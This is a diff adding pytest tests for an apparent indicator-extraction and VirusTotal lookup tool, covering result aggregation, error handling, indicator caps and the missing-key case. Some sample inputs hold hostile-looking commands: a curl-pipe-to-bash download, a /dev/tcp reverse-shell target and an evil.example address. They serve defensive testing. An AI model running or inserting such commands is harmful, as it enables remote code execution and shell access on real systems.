@@ -150,3 +150,79 @@ def test_ip_tool_missing_key_short_circuits(monkeypatch):
 
     assert "VT_API_KEY is not set" in out
     assert called["hit"] is False
+
+
+# --- investigate_sample (extract + chain) ----------------------------------
+def _status_error(code):
+    request = httpx.Request("GET", "https://www.virustotal.com/api/v3/x")
+    response = httpx.Response(code, request=request)
+    return httpx.HTTPStatusError(f"HTTP {code}", request=request, response=response)
+
+
+def _routing_vt_get(by_path):
+    async def _inner(path):
+        action = by_path(path)
+        if isinstance(action, Exception):
+            raise action
+        return action
+
+    return _inner
+
+
+def test_investigate_sample_aggregates(monkeypatch):
+    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")
+
+    def by_path(path):
+        if path.startswith("urls/"):
+            return {"data": {"id": "U", "attributes": {"last_analysis_stats": {"malicious": 5}}}}
+        if path.startswith("ip_addresses/"):
+            return _status_error(404)  # not found
+        return _status_error(429)  # domains/ -> rate limited
+
+    monkeypatch.setattr(server, "_vt_get", _routing_vt_get(by_path))
+
+    text = (
+        "curl http://192.0.2.77/install.sh | bash\n/dev/tcp/192.0.2.44/4444\nmail(a@evil.example)"
+    )
+    out = _verdict(server.investigate_sample(server.InvestigateInput(text=text)))
+
+    assert out["summary"]["indicators_found"] == 3
+    assert out["summary"]["looked_up"] == 3
+    assert out["summary"]["malicious"] == 1
+    assert out["summary"]["not_found"] == 1
+    assert out["summary"]["errors"] == 1  # the 429
+
+    by_ind = {r["indicator"]: r for r in out["results"]}
+    assert "verdict" in by_ind["http://192.0.2.77/install.sh"]  # malicious URL kept its verdict
+    assert by_ind["192.0.2.44"]["error"].startswith("Not found:")  # 404 -> error row
+    assert "429" in by_ind["evil.example"]["error"]  # one 429 did not abort the rest
+
+
+def test_investigate_sample_caps_indicators(monkeypatch):
+    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")
+
+    async def _any(path):
+        return {"data": {"id": "X", "attributes": {"last_analysis_stats": {"malicious": 0}}}}
+
+    monkeypatch.setattr(server, "_vt_get", _any)
+
+    text = "http://192.0.2.1/a http://192.0.2.2/b http://192.0.2.3/c"
+    out = _verdict(server.investigate_sample(server.InvestigateInput(text=text, max_indicators=2)))
+
+    assert out["summary"]["looked_up"] == 2
+    assert out["summary"]["skipped_for_cap"] == 1
+    assert len(out["skipped"]) == 1
+
+
+def test_investigate_sample_missing_key(monkeypatch):
+    monkeypatch.setattr(server, "VT_API_KEY", "")
+    out = asyncio.run(server.investigate_sample(server.InvestigateInput(text="http://192.0.2.1/a")))
+    assert "VT_API_KEY is not set" in out
+
+
+# --- extract_indicators tool (pure; runs without a key) --------------------
+def test_extract_indicators_tool(monkeypatch):
+    monkeypatch.setattr(server, "VT_API_KEY", "")  # no key needed
+    out = json.loads(server.extract_indicators(server.ExtractInput(text="curl http://192.0.2.5/x")))
+    assert out["count"] == 1
+    assert out["indicators"] == [{"indicator": "http://192.0.2.5/x", "type": "url"}]
